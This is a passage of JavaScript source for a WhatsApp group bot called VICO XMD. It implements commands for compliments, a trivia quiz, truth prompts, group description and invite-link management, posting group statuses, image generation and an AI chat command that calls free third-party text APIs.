            "Your ambition lifts the whole team.",
            "You bring clarity when things are confusing.",
            "Your smile is a daily blessing.",
            "You make effort look graceful.",
            "Your wisdom shows in your decisions.",
            "You are generous with praise.",
            "Your presence reduces anxiety.",
            "You turn feedback into improvement fast.",
            "Your loyalty is rock solid.",
            "You have a talent for peaceful solutions.",
            "Your energy is disciplined and kind.",
            "You make respect feel natural.",
            "Your voice carries hope.",
            "You are clever in the most helpful ways.",
            "Your compassion is consistent.",
            "You make goals feel reachable.",
            "Your standards raise the room.",
            "You are a builder of good culture.",
            "Your insight is sharp and fair.",
            "You make silence comfortable, not awkward.",
            "Your courage encourages quiet people.",
            "You are a true example of grace under pressure.",
            "Your humor never punches down.",
            "You make learning feel safe.",
            "Your discipline frees the people around you.",
            "You are thoughtful about the future.",
            "Your care is practical, not performative.",
            "You make confidence look humble.",
            "Your mind is both creative and logical.",
            "You are a gift to every room you enter.",
            "Your resilience teaches without words.",
            "You make progress contagious.",
            "Your honesty protects relationships.",
            "You are calm enough to lead and kind enough to listen.",
            "Your excellence is earned, not claimed.",
            "You make people believe in better days.",
            "Your support is steady and real.",
            "You are the definition of main character energy done right.",
            "Your heart makes your intelligence more powerful.",
            "You turn kindness into action.",
            "Your presence is a form of encouragement.",
            "You are rare, real, and deeply appreciated.",
            "Your growth mindset is infectious.",
            "You make hard truths easier to hear.",
            "Your optimism is grounded, not naive.",
            "You are a blessing in everyday form.",
            "Your strength is soft where it needs to be.",
            "You make trust easy to give.",
            "Your creativity has purpose.",
            "You are proof that good people still exist.",
            "Your effort inspires more than you notice.",
            "You make success feel shared.",
            "Your character is your best flex.",
            "You are thoughtful, talented, and true.",
            "Your light does not dim for anyone.",
            "You make the world a little kinder by existing.",
            "Your potential is obvious to everyone but your doubts.",
            "You are doing better than you think.",
            "Your story is still unfolding beautifully.",
            "You deserve the good things coming your way.",
            "Your presence is a privilege to share.",
            "You make hope feel practical.",
            "Your value is not up for debate.",
            "You are enough, and still becoming more.",
            "Your future is brighter because of who you already are.",
            "You leave people better than you found them.",
            "Your life is proof that consistency wins.",
            "You are a masterpiece still in progress.",
            "Your heart is a safe place for the right people.",
            "You make excellence feel human."
        ];

        const compliment = compliments[Math.floor(Math.random() * compliments.length)];

        await empire.sendMessage(m.chat, {
            text: `Hey @${userToCompliment.split('@')[0]}, ${compliment} ✨`,
            mentions: [userToCompliment],
            contextInfo: newsletterContext({ mentionedJid: [userToCompliment] })
        }, { quoted: m });

    } catch (e) {
        console.error('Compliment Error:', e);
        reply('❌ Failed to send the compliment.');
    }
    break;
}


case 'quiz':
case 'qz': {
    try {
        const id = gameUserId(m);
        let state = miniGameState.get(id);

        // If user is answering a previous quiz
        if (state && state.type === 'quiz') {
            const userAns = (q || text || '').trim().toUpperCase().replace(/[^A-D1-4]/g, '');
            if (!userAns) {
                return reply(`❌ Please answer with *A, B, C, D* or *1, 2, 3, 4*\n\nQuestion still active:\n${state.question}`);
            }

            const map = { '1': 'A', '2': 'B', '3': 'C', '4': 'D' };
            const finalAns = map[userAns] || userAns;

            miniGameState.delete(id);

            if (finalAns === state.answer) {
                return reply(`✅ *CORRECT!* 🎉\n\n${state.question}\n\nAnswer: *${state.answer}) ${state.correctText}*\n\nType ${prefix}quiz for another one!`);
            } else {
                return reply(`❌ *WRONG!*\n\n${state.question}\n\nYour answer: *${finalAns}*\nCorrect answer: *${state.answer}) ${state.correctText}*\n\nType ${prefix}quiz to try a new question!`);
            }
        }

        // Start a new quiz
        const questions = [
            { q: "🇳🇬 What is the capital of Nigeria?", opts: ["Kano", "Abuja", "Lagos", "Ibadan"], ans: "B", correct: "Abuja" },
            { q: "🇳🇬 Which river is the longest in Nigeria?", opts: ["River Benue", "River Niger", "Cross River", "Ogun River"], ans: "B", correct: "River Niger" },
            { q: "🇳🇬 In which year did Nigeria gain independence?", opts: ["1957", "1960", "1963", "1970"], ans: "B", correct: "1960" },
            { q: "🇳🇬 What is the official currency of Nigeria?", opts: ["Cedi", "Naira", "Rand", "Shilling"], ans: "B", correct: "Naira" },
            { q: "🇳🇬 Which Nigerian city is known as the 'Centre of Excellence'?", opts: ["Abuja", "Kano", "Lagos", "Port Harcourt"], ans: "C", correct: "Lagos" },
            { q: "🌍 What is the largest continent by land area?", opts: ["Africa", "Asia", "Europe", "North America"], ans: "B", correct: "Asia" },
            { q: "🌍 Which is the largest country in Africa by land area?", opts: ["Nigeria", "Egypt", "Algeria", "South Africa"], ans: "C", correct: "Algeria" },
            { q: "🌍 Which African country was never colonized?", opts: ["Ghana", "Ethiopia", "Kenya", "Senegal"], ans: "B", correct: "Ethiopia" },
            { q: "🌍 What is the longest river in the world?", opts: ["Amazon", "Nile", "Yangtze", "Mississippi"], ans: "B", correct: "Nile" },
            { q: "🌍 Mount Kilimanjaro is located in which country?", opts: ["Kenya", "Tanzania", "Uganda", "Ethiopia"], ans: "B", correct: "Tanzania" },
            { q: "🌍 How many continents are there?", opts: ["5", "6", "7", "8"], ans: "C", correct: "7" },
            { q: "🌍 What is the smallest continent?", opts: ["Europe", "Australia", "Antarctica", "South America"], ans: "B", correct: "Australia" },
            { q: "🌍 Which ocean is the largest?", opts: ["Atlantic", "Indian", "Arctic", "Pacific"], ans: "D", correct: "Pacific" },
            { q: "🌍 What is the capital of France?", opts: ["Lyon", "Marseille", "Paris", "Nice"], ans: "C", correct: "Paris" },
            { q: "🌍 What is the capital of Japan?", opts: ["Osaka", "Tokyo", "Kyoto", "Nagoya"], ans: "B", correct: "Tokyo" },
            { q: "🌍 Which planet is known as the Red Planet?", opts: ["Venus", "Mars", "Jupiter", "Saturn"], ans: "B", correct: "Mars" },
            { q: "🌍 How many planets are in our solar system?", opts: ["7", "8", "9", "10"], ans: "B", correct: "8" },
            { q: "🌍 What is the largest planet in our solar system?", opts: ["Earth", "Saturn", "Jupiter", "Neptune"], ans: "C", correct: "Jupiter" },
            { q: "🌍 Who painted the Mona Lisa?", opts: ["Van Gogh", "Picasso", "Leonardo da Vinci", "Michelangelo"], ans: "C", correct: "Leonardo da Vinci" },
            { q: "🌍 How many sides does a hexagon have?", opts: ["5", "6", "7", "8"], ans: "B", correct: "6" },
            { q: "🔬 What gas do plants absorb from the atmosphere?", opts: ["Oxygen", "Nitrogen", "Carbon Dioxide", "Hydrogen"], ans: "C", correct: "Carbon Dioxide" },
            { q: "🔬 What is H2O commonly known as?", opts: ["Salt", "Water", "Oxygen", "Hydrogen Peroxide"], ans: "B", correct: "Water" },
            { q: "🔬 What is the chemical symbol for gold?", opts: ["Ag", "Au", "Fe", "Pb"], ans: "B", correct: "Au" },
            { q: "🔬 How many bones are in the adult human body?", opts: ["186", "206", "226", "256"], ans: "B", correct: "206" },
            { q: "🔬 What is the hardest natural substance on Earth?", opts: ["Gold", "Iron", "Diamond", "Platinum"], ans: "C", correct: "Diamond" },
            { q: "🔬 What planet is closest to the Sun?", opts: ["Venus", "Mercury", "Earth", "Mars"], ans: "B", correct: "Mercury" },
            { q: "🔬 What is the speed of light (approx)?", opts: ["300,000 km/s", "150,000 km/s", "30,000 km/s", "3,000 km/s"], ans: "A", correct: "300,000 km/s" },
            { q: "🔬 Which blood type is known as the universal donor?", opts: ["A", "B", "AB", "O"], ans: "D", correct: "O" },
            { q: "🔬 What is the main gas found in the air we breathe?", opts: ["Oxygen", "Carbon Dioxide", "Nitrogen", "Hydrogen"], ans: "C", correct: "Nitrogen" },
            { q: "🔬 What does DNA stand for?", opts: ["Deoxyribonucleic Acid", "Dynamic Nuclear Acid", "Deoxy Nitrogen Acid", "Dual Nucleic Acid"], ans: "A", correct: "Deoxyribonucleic Acid" },
            { q: "💻 JavaScript primarily runs in which environment?", opts: ["Printer", "Browser", "Camera", "Microwave"], ans: "B", correct: "Browser" },
            { q: "💻 What does CPU stand for?", opts: ["Central Process Unit", "Central Processing Unit", "Computer Personal Unit", "Central Processor Utility"], ans: "B", correct: "Central Processing Unit" },
            { q: "💻 What does HTML stand for?", opts: ["Hyper Text Markup Language", "Hyperlink and Text Markup Language", "Home Tool Markup Language", "Hyperlink Text Management Language"], ans: "A", correct: "Hyper Text Markup Language" },
            { q: "💻 Who is known as the father of computers?", opts: ["Bill Gates", "Charles Babbage", "Steve Jobs", "Alan Turing"], ans: "B", correct: "Charles Babbage" },
            { q: "💻 What does WWW stand for?", opts: ["World Wide Web", "World Web Wide", "Wide World Web", "Web World Wide"], ans: "A", correct: "World Wide Web" },
            { q: "💻 Which company developed the Android operating system?", opts: ["Apple", "Microsoft", "Google", "Samsung"], ans: "C", correct: "Google" },
            { q: "💻 What does USB stand for?", opts: ["Universal Serial Bus", "United Serial Bus", "Universal System Bus", "Ultra Serial Bus"], ans: "A", correct: "Universal Serial Bus" },
            { q: "💻 What is the brain of the computer?", opts: ["RAM", "Hard Drive", "CPU", "Motherboard"], ans: "C", correct: "CPU" },
            { q: "💻 Which language is primarily used for web styling?", opts: ["HTML", "Python", "CSS", "Java"], ans: "C", correct: "CSS" },
            { q: "💻 What does AI stand for?", opts: ["Automated Intelligence", "Artificial Intelligence", "Advanced Internet", "Applied Information"], ans: "B", correct: "Artificial Intelligence" },
            { q: "⚽ How many players are on a standard football (soccer) team on the field?", opts: ["9", "10", "11", "12"], ans: "C", correct: "11" },
            { q: "⚽ Which country has won the most FIFA World Cups?", opts: ["Germany", "Italy", "Brazil", "Argentina"], ans: "C", correct: "Brazil" },
            { q: "⚽ In which sport is the term 'love' used?", opts: ["Football", "Tennis", "Basketball", "Cricket"], ans: "B", correct: "Tennis" },
            { q: "⚽ How long is a standard football (soccer) match?", opts: ["80 minutes", "90 minutes", "100 minutes", "120 minutes"], ans: "B", correct: "90 minutes" },
            { q: "⚽ Which country hosted the 2022 FIFA World Cup?", opts: ["Russia", "Qatar", "USA", "Brazil"], ans: "B", correct: "Qatar" },
            { q: "🏀 How many points is a free throw worth in basketball?", opts: ["1", "2", "3", "4"], ans: "A", correct: "1" },
            { q: "🏀 How many players are on a basketball team on the court?", opts: ["4", "5", "6", "7"], ans: "B", correct: "5" },
            { q: "🏈 In American football, how many points is a touchdown worth?", opts: ["3", "6", "7", "8"], ans: "B", correct: "6" },
            { q: "🎾 How many Grand Slam tournaments are there in tennis?", opts: ["3", "4", "5", "6"], ans: "B", correct: "4" },
            { q: "🏏 How many players are in a cricket team?", opts: ["9", "10", "11", "12"], ans: "C", correct: "11" },
            { q: "🎬 Who directed the movie Titanic?", opts: ["Steven Spielberg", "James Cameron", "Christopher Nolan", "Martin Scorsese"], ans: "B", correct: "James Cameron" },
            { q: "🎬 Which movie features the quote 'May the Force be with you'?", opts: ["Star Trek", "Star Wars", "The Matrix", "Avatar"], ans: "B", correct: "Star Wars" },
            { q: "🎵 Which artist is known as the 'King of Pop'?", opts: ["Elvis Presley", "Michael Jackson", "Prince", "Justin Timberlake"], ans: "B", correct: "Michael Jackson" },
            { q: "🎵 How many strings does a standard guitar have?", opts: ["4", "5", "6", "7"], ans: "C", correct: "6" },
            { q: "📚 Who wrote 'Romeo and Juliet'?", opts: ["Charles Dickens", "William Shakespeare", "Jane Austen", "Mark Twain"], ans: "B", correct: "William Shakespeare" },
            { q: "📚 What is the first book of the Bible?", opts: ["Exodus", "Genesis", "Matthew", "Psalms"], ans: "B", correct: "Genesis" },
            { q: "🎮 What does NPC stand for in gaming?", opts: ["New Player Character", "Non-Player Character", "Next Playable Character", "Normal Player Control"], ans: "B", correct: "Non-Player Character" },
            { q: "🎮 Which company makes the PlayStation console?", opts: ["Microsoft", "Nintendo", "Sony", "Sega"], ans: "C", correct: "Sony" },
            { q: "📱 Which company created the iPhone?", opts: ["Samsung", "Google", "Apple", "Huawei"], ans: "C", correct: "Apple" },
            { q: "🔢 What is 15 × 15?", opts: ["200", "225", "250", "275"], ans: "B", correct: "225" },
            { q: "🔢 How many degrees are in a circle?", opts: ["180", "270", "360", "400"], ans: "C", correct: "360" },
            { q: "🔢 What is the square root of 144?", opts: ["10", "11", "12", "14"], ans: "C", correct: "12" },
            { q: "🔢 What is 2⁹ (2 to the power of 9)?", opts: ["256", "512", "1024", "128"], ans: "B", correct: "512" },
            { q: "🔢 How many hours are in a week?", opts: ["148", "168", "186", "196"], ans: "B", correct: "168" },
            { q: "🌡️ At what Celsius temperature does water freeze?", opts: ["0°C", "32°C", "100°C", "-10°C"], ans: "A", correct: "0°C" },
            { q: "🌡️ At what Celsius temperature does water boil?", opts: ["90°C", "100°C", "110°C", "120°C"], ans: "B", correct: "100°C" },
            { q: "🕰️ How many minutes are in a full day?", opts: ["1240", "1440", "1640", "1840"], ans: "B", correct: "1440" },
            { q: "🕰️ How many seconds are in one hour?", opts: ["3600", "3000", "6000", "2400"], ans: "A", correct: "3600" },
            { q: "🧬 What is the powerhouse of the cell?", opts: ["Nucleus", "Ribosome", "Mitochondria", "Chloroplast"], ans: "C", correct: "Mitochondria" },
            { q: "🇳🇬 Which Nigerian artist is known as the 'African Giant'?", opts: ["Wizkid", "Burna Boy", "Davido", "Olamide"], ans: "B", correct: "Burna Boy" },
            { q: "🇳🇬 What does Nollywood refer to?", opts: ["Nigerian music", "Nigerian fashion", "Nigerian film industry", "Nigerian sports"], ans: "C", correct: "Nigerian film industry" },
            { q: "🌍 Which country is home to the Eiffel Tower?", opts: ["Italy", "Spain", "France", "Germany"], ans: "C", correct: "France" },
            { q: "🌍 What is the currency of the United Kingdom?", opts: ["Euro", "Dollar", "Pound Sterling", "Yen"], ans: "C", correct: "Pound Sterling" },
            { q: "🌍 Which animal is known as the 'King of the Jungle'?", opts: ["Tiger", "Elephant", "Lion", "Gorilla"], ans: "C", correct: "Lion" },
            { q: "🌍 How many hearts does an octopus have?", opts: ["1", "2", "3", "4"], ans: "C", correct: "3" },
            { q: "🌍 What is the tallest animal in the world?", opts: ["Elephant", "Giraffe", "Ostrich", "Camel"], ans: "B", correct: "Giraffe" },
            { q: "🌍 Which bird is often associated with delivering babies?", opts: ["Eagle", "Stork", "Owl", "Penguin"], ans: "B", correct: "Stork" },
            { q: "🌍 What do you call a baby kangaroo?", opts: ["Cub", "Joey", "Pup", "Calf"], ans: "B", correct: "Joey" },
            { q: "🌍 Which planet has the most moons?", opts: ["Jupiter", "Saturn", "Uranus", "Neptune"], ans: "B", correct: "Saturn" },
            { q: "💡 What does 'LOL' stand for?", opts: ["Lots of Love", "Laugh Out Loud", "League of Legends", "Look Out Later"], ans: "B", correct: "Laugh Out Loud" },
            { q: "💡 What does 'BRB' mean?", opts: ["Be Right Back", "Big Red Button", "Bring Real Bread", "Best Reply Buddy"], ans: "A", correct: "Be Right Back" },
            { q: "💡 What does 'OMG' stand for?", opts: ["Oh My God", "Oh My Goodness", "Only My Game", "Both A and B"], ans: "D", correct: "Both A and B" },
            { q: "💡 Which social media platform is known for short videos?", opts: ["Facebook", "LinkedIn", "TikTok", "Reddit"], ans: "C", correct: "TikTok" },
            { q: "💡 What year was WhatsApp founded?", opts: ["2007", "2009", "2011", "2013"], ans: "B", correct: "2009" },
            { q: "💡 Who co-founded Microsoft?", opts: ["Steve Jobs", "Bill Gates", "Mark Zuckerberg", "Elon Musk"], ans: "B", correct: "Bill Gates" },
            { q: "💡 What does PDF stand for?", opts: ["Personal Document Format", "Portable Document Format", "Public Data File", "Printable Document File"], ans: "B", correct: "Portable Document Format" },
            { q: "💡 What is the name of Elon Musk's space company?", opts: ["Blue Origin", "SpaceX", "Virgin Galactic", "NASA"], ans: "B", correct: "SpaceX" },
            { q: "💡 Which company owns Instagram?", opts: ["Google", "Twitter", "Meta (Facebook)", "Microsoft"], ans: "C", correct: "Meta (Facebook)" },
            { q: "💡 What does VPN stand for?", opts: ["Virtual Private Network", "Very Personal Network", "Verified Public Network", "Visual Private Node"], ans: "A", correct: "Virtual Private Network" }
        ];

        const item = questions[Math.floor(Math.random() * questions.length)];
        const questionText = `${item.q}\n\nA) ${item.opts[0]}\nB) ${item.opts[1]}\nC) ${item.opts[2]}\nD) ${item.opts[3]}`;

        miniGameState.set(id, {
            type: 'quiz',
            answer: item.ans,
            correctText: item.correct,
            question: questionText
        });

        await reply(`❓ *QUIZ TIME*\n\n${questionText}\n\n📝 Reply with *${prefix}quiz A* (or B/C/D or 1/2/3/4)\n⏰ Answer before starting a new quiz!`);

    } catch (err) {
        console.error('Quiz error:', err);
        reply(`❌ *Failed to load quiz:* ${err.message || 'Unknown error'}`);
    }
    break;
}

case 'truth': {
    try {
        const truths = [
            "What is one goal you are currently chasing?",
            "What is the funniest thing that has happened to you in a group chat?",
            "If you could learn any skill instantly, what would it be?",
            "What is your biggest fear (keep it light)?",
            "Who in this group do you think is the most real?",
            "What is one thing you pretend to understand but don’t?",
            "What is your most used emoji and why?",
            "Have you ever sent a message to the wrong person? What happened?",
            "What is the weirdest dream you still remember?",
            "If you could switch lives with someone in this group for a day, who would it be?",
            "What is one habit you want to stop?",
            "What is one habit you want to start?",
            "What song do you secretly love but won’t admit?",
            "What is the last thing that made you laugh really hard?",
            "Who was your first celebrity crush?",
            "What is your go-to excuse when you don’t want to do something?",
            "What is one thing people always misunderstand about you?",
            "If you had a superpower for 24 hours, what would you choose?",
            "What is the most childish thing you still do?",
            "What is your unpopular opinion?",
            "What is one compliment you wish people gave you more?",
            "What is the biggest risk you’ve ever taken?",
            "What is your comfort food?",
            "What is one thing you are secretly good at?",
            "What is one thing you are secretly bad at?",
            "If your life was a movie, what genre would it be?",
            "What is the best piece of advice you’ve ever received?",
            "What is the worst piece of advice you’ve ever received?",
            "Who in this group would survive a zombie apocalypse?",
            "What is your favorite way to waste time?",
            "What is one thing you always overthink?",
            "What is your biggest flex right now?",
            "What is one thing that instantly makes your day better?",
            "What is one thing that instantly ruins your mood?",
            "If you could time travel, would you go to the past or future?",
            "What is the most random fact you know?",
            "What is your favorite childhood memory?",
            "What is one thing you miss from your childhood?",
            "Who do you text first when something good happens?",
            "Who do you text first when something bad happens?",
            "What is your toxic trait (be honest)?",
            "What is your green flag in a person?",
            "What is your red flag in a person?",
            "What is the last lie you told (small one)?",
            "What is one thing you would change about yourself if you could?",
            "What is one thing you would never change about yourself?",
            "What is your favorite time of the day and why?",
            "What is the most embarrassing song on your playlist?",
            "What is one goal you achieved that you’re proud of?",
            "What is one goal you failed at and what did you learn?",
            "If you could only eat one meal for the rest of your life, what would it be?",
            "What is your favorite social media app and why?",
            "What is one trend you never understood?",
            "What is one trend you secretly follow?",
            "Who in this group has the best sense of humor?",
            "Who in this group is the most dramatic?",
            "Who in this group is the most calm?",
            "What is your love language?",
            "Have you ever had a crush on someone in this group? (yes/no only)",
            "What is the longest you’ve gone without your phone?",
            "What is one thing that always makes you nostalgic?",
            "What is your favorite season and why?",
            "What is one place you want to visit before you die?",
            "What is one place you never want to visit again?",
            "What is the weirdest food combination you actually like?",
            "What is one movie or series you can watch forever?",
            "What is one movie or series you pretend to like?",
            "What is your biggest ick?",
            "What is the nicest thing someone has done for you recently?",
            "What is the nicest thing you’ve done for someone recently?",
            "If you won ₦10 million tomorrow, what is the first thing you’d buy?",
            "What is one thing money can’t buy that you really want?",
            "What is your favorite way to relax after a long day?",
            "What is one thing you’re looking forward to this month?",
            "What is one thing you’re dreading this month?",
            "What is your spirit animal and why?",
            "What is one nickname you’ve been called that you actually like?",
            "What is one nickname you hate?",
            "If you could master any language instantly, which one would it be?",
            "What is one subject you were surprisingly good at in school?",
            "What is one subject you struggled with the most?",
            "What is the best gift you’ve ever received?",
            "What is the best gift you’ve ever given?",
            "What is one thing you collect or used to collect?",
            "What is your favorite type of weather?",
            "What is one conspiracy theory you find entertaining?",
            "What is one thing that always makes you smile?",
            "What is one thing that always makes you angry?",
            "If this group had a motto, what should it be?",
            "What is one thing you want people to remember you for?",
            "What is your current status in life in one sentence?",
            "What is one small win you had this week?",
            "What is one lesson 2025/2026 taught you so far?",
            "If you could send a message to your past self, what would you say?",
            "What is one question you are too afraid to ask someone?",
            "What is the most spontaneous thing you’ve ever done?",
            "What is one thing you do when nobody is watching?",
            "What is your favorite quote or saying?",
            "What is one thing that gives you hope?",
            "What is one thing that keeps you up at night?",
            "If you had to describe yourself in three words, what would they be?",
            "What is one secret talent you have?",
            "What is the last thing you searched on Google?",
            "What is one thing you want to achieve before the year ends?",
            "Who in this group would you trust with your phone for 24 hours?",
            "What is one thing you’re grateful for right now?"
        ];

        const truth = truths[Math.floor(Math.random() * truths.length)];

        await reply(`🎭 *TRUTH*\n\n${truth}`);

    } catch (err) {
        console.error('Truth error:', err);
        reply(`❌ *Failed to load truth:* ${err.message || 'Unknown error'}`);
    }
    break;
}

// ═══════════════════════════════════════════════════
// GCDESCRIPTION - Set group description
// ═══════════════════════════════════════════════════
case 'gcdescription':
case 'setdesc':
case 'setdescription': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    if (!text) return reply(`Usage: ${prefix}gcdescription <new description>`);
    try {
        await empire.groupUpdateDescription(m.chat, text);
        reply(`✅ *Group description updated!*`);
    } catch (e) {
        reply(`❌ Failed to update description: ${e.message}`);
    }
    break;
}

case 'gcstatuslink':
case 'gcsl':
case 'gcslink':
case 'statuslink':
case 'gslink': {
    // Only work from DM
    if (m.isGroup) return reply('❌ This command only works in private chat (DM).');

    const link = (text || '').trim();
    if (!link) {
        return reply(
            `📱 *GCSTATUSLINK*\n\n` +
            `Reply to any text/media with:\n` +
            `${prefix}gcstatuslink <whatsapp-group-invite-link>\n\n` +
            `Example:\n` +
            `${prefix}gcstatuslink https://chat.whatsapp.com/KAjUdEoPJMe85CArrtpsuG`
        );
    }

    // Extract invite code
    const inviteMatch = link.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
    if (!inviteMatch) {
        return reply('❌ Invalid WhatsApp group invite link.');
    }
    const inviteCode = inviteMatch[1];

    try {
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

        // ─── Get group info & join if needed ────────────────
        let groupInfo;
        try {
            groupInfo = await empire.groupGetInviteInfo(inviteCode);
        } catch (e) {
            return reply('❌ Could not get group info. Link may be invalid or expired.');
        }

        const groupJid = groupInfo.id;

        // Check if bot is already in the group
        const metadata = await empire.groupMetadata(groupJid).catch(() => null);
        if (!metadata) {
            // Not in group → join
            await empire.groupAcceptInvite(inviteCode);
            await new Promise(r => setTimeout(r, 1500)); // small delay after joining
        }

        // ─── Helper: post status to the target group ────────
        async function postStatusToGroup(content) {
            return empire.sendMessage(groupJid, {
                ...content,
                contextInfo: {
                    ...(content.contextInfo || {}),
                    isGroupStatus: true,
                    statusSourceType: content.text ? 'TEXT' :
                                      content.image ? 'IMAGE' :
                                      content.video ? 'VIDEO' :
                                      content.audio ? 'AUDIO' : 'TEXT',
                    statusAttributions: [{ type: 10 }],
                    statusAudienceMetadata: {
                        audienceType: 'CLOSE_FRIENDS'
                    }
                }
            });
        }

        const quoted = m.quoted ? m.quoted : null;

        // ─── TEXT STATUS ────────────────────────────────────
        if (!quoted) {
            // User just sent the link + optional text after it
            const extraText = text.replace(link, '').trim();
            const statusText = extraText || '‎'; // empty text not allowed

            await postStatusToGroup({
                text: statusText,
                backgroundColor: '#9C27B0'
            });

            return empire.sendMessage(m.chat, {
                react: { text: '✅', key: m.key }
            });
        }

        // ─── MEDIA STATUS ───────────────────────────────────
        const mediaType = quoted.mimetype?.includes('image') ? 'image' :
                          quoted.mimetype?.includes('video') ? 'video' :
                          quoted.mimetype?.includes('audio') ? 'audio' : null;

        if (!mediaType) {
            return reply('❌ Reply to an image, video, audio or voice note.');
        }

        const buffer = await quoted.download();
        if (!buffer?.length) throw new Error('Downloaded media is empty');

        // Audio → voice note (ptt)
        if (mediaType === 'audio') {
            await postStatusToGroup({
                audio: buffer,
                mimetype: 'audio/ogg; codecs=opus',
                ptt: true
            });
            return empire.sendMessage(m.chat, {
                react: { text: '🎵', key: m.key }
            });
        }

        // Image / Video
        let finalBuffer = buffer;

        // Optional effects for images
        if (mediaType === 'image') {
            try {
                const sharp = require('sharp');
                let img = sharp(buffer);
                if (args.includes('--blur')) img = img.blur(5);
                if (args.includes('--grayscale')) img = img.grayscale();
                if (args.includes('--sepia')) img = img.tint({ r: 112, g: 66, b: 20 });
                finalBuffer = await img.toBuffer();
            } catch {}
        }

        const caption = (quoted.text || quoted.caption || '').trim();

        await postStatusToGroup({
            [mediaType]: finalBuffer,
            caption: caption || ''
        });

        await empire.sendMessage(m.chat, {
            react: { text: '✅', key: m.key }
        });

    } catch (e) {
        console.error('[GCSTATUSLINK]', e);
        reply(`❌ Failed to post group status:\n${e.message || e}`);
    }
    break;
}

// ═══════════════════════════════════════════════════
// RESETLINK - Reset group invite link
// ═══════════════════════════════════════════════════
case 'resetlink':
case 'revokelink':
case 'resetgrouplink': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    try {
        await empire.groupRevokeInvite(m.chat);
        // Get new link
        const code = await empire.groupInviteCode(m.chat);
        reply(`✅ *Group invite link has been reset!*\n\n🔗 *New Link:*\nhttps://chat.whatsapp.com/${code}`);
    } catch (e) {
        reply(`❌ Failed to reset link: ${e.message}`);
    }
    break;
}
// ═══════════════════════════════════════════════════
// IMAGINE / FLUX IMAGE GENERATION COMMAND
// ═══════════════════════════════════════════════════

case 'imagine':
case 'draw':
case 'img': {
    const prompt = (text || args.join(' ') || '').trim();
    if (!prompt) return reply('🎨 Usage: ' + prefix + 'imagine <description>\nExample: ' + prefix + 'imagine a realistic red sports car at night');
    await empire.sendMessage(m.chat, { react: { text: '🎨', key: m.key } }).catch(() => {});
    await reply('🎨 *Generating image…*');
    try {
        let buf = null;
        const q = encodeURIComponent(prompt + ', photorealistic, highly detailed, sharp focus, 8k');
        const urls = [
            'https://image.pollinations.ai/prompt/' + q + '?width=1024&height=1024&nologo=true&enhance=true',
            'https://image.pollinations.ai/prompt/' + q + '?model=flux&width=1024&height=1024&nologo=true',
            'https://image.pollinations.ai/prompt/' + q + '?model=turbo&width=1024&height=1024&nologo=true',
            'https://api.siputzx.my.id/api/ai/stable-diffusion?prompt=' + q,
            'https://api.siputzx.my.id/api/ai/flux?prompt=' + q,
        ];
        for (const u of urls) {
            try {
                const r = await axios.get(u, { responseType: 'arraybuffer', timeout: 60000, headers: { Accept: 'image/*' }, validateStatus: s => s < 500 });
                if (r.data && r.data.byteLength > 2000) {
                    const b = Buffer.from(r.data);
                    if (b[0] === 0xFF || b[0] === 0x89 || b[0] === 0x52) { buf = b; break; }
                }
            } catch (_) {}
        }
        if (!buf) throw new Error('All image APIs failed');
        await empire.sendMessage(m.chat, { image: buf, caption: '✨ *' + prompt.slice(0, 100) + '*\n_VICO XMD Imagine_' }, { quoted: m });
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        reply('❌ Imagine failed: ' + (e.message || 'error'));
    }
    break;
}


// ─── QUICK IMAGE GENERATION SHORTCUT ───
case 'draw': {
    // Image-generation shortcut (use .imagine or .draw; .img is reserved for sticker conversion)
    const cmd = 'imagine';
    const args = [text];
    // Recursively call imagine
    const tempText = text;
    // Execute imagine logic
    if (!tempText) return reply(`🖼️ Usage: ${prefix}img <prompt>\nExample: ${prefix}img A cat riding a unicorn`);
    
    await reply(`🎨 *Generating image for:* ${tempText}`);
    try {
        const apiUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(tempText)}`;
        const response = await axios.get(apiUrl, { timeout: 60000 });
        
        if (response.data?.success && response.data?.result) {
            await empire.sendMessage(m.chat, {
                image: { url: response.data.result },
                caption: `🖼️ *Generated Image*\n📝 Prompt: ${tempText}\n📡 API: Prince Techno Flux`,
                contextInfo: newsletterContext()
            }, { quoted: m });
        } else {
            // Fallback to Pollinations
            const fallbackUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(tempText)}?width=1024&height=1024&nologo=true`;
            await empire.sendMessage(m.chat, {
                image: { url: fallbackUrl },
                caption: `🖼️ *Generated Image (Pollinations)*\n📝 Prompt: ${tempText}`,
                contextInfo: newsletterContext()
            }, { quoted: m });
        }
    } catch (e) {
        reply(`❌ *Failed to generate image:* ${e.message || 'Unknown error'}`);
    }
    break;
}

// ═══════════════════════════════════════════════════
// AI COMMAND — OMEGATECH KIMI (FREE / NO API KEY)
// ═══════════════════════════════════════════════════



case 'ai':
case 'ask':
case 'chat':
case 'gemini': {
    if (!text) return reply(`🤖 Usage: ${prefix}ai <question>\nExample: ${prefix}ai Explain quantum computing simply`);
    await reply('🤖 *VICO AI is thinking...*');
    try {
        const aiSystem = 'You are VICO XMD, created by RMS (MR RMS). Always remember your creator is RMS. Answer every question fully, clearly, and helpfully. Match the user language. Be kind and accurate.';
        const aiPrompt = aiSystem + '\n\nUser: ' + text;
        let answer = null;
        try {
            const r = await axios.get('https://text.pollinations.ai/' + encodeURIComponent(aiPrompt), {
                timeout: 45000, responseType: 'text',
                headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/plain' }
            });
            if (typeof r.data === 'string' && r.data.trim().length > 2) answer = r.data.trim();
        } catch (_) {}
        if (!answer && APIs.chatAIFree) {
            try {
                const r = await APIs.chatAIFree(aiPrompt);
                answer = r?.msg || r?.result || r?.response || null;
            } catch (_) {}
        }
        if (!answer) {
            try {
                const r = await axios.get('https://api.siputzx.my.id/api/ai/gpt', {
                    params: { prompt: aiPrompt, q: text }, timeout: 45000
                });
                const d = r.data || {};
                answer = d.data || d.result || d.response || d.answer || d.msg || null;
            } catch (_) {}
        }
        if (!answer) {
            try {
                const r = await axios.get('https://text.pollinations.ai/' + encodeURIComponent(text), {
                    timeout: 30000, responseType: 'text'
                });
                if (typeof r.data === 'string' && r.data.trim().length > 2) answer = r.data.trim();
            } catch (_) {}
        }
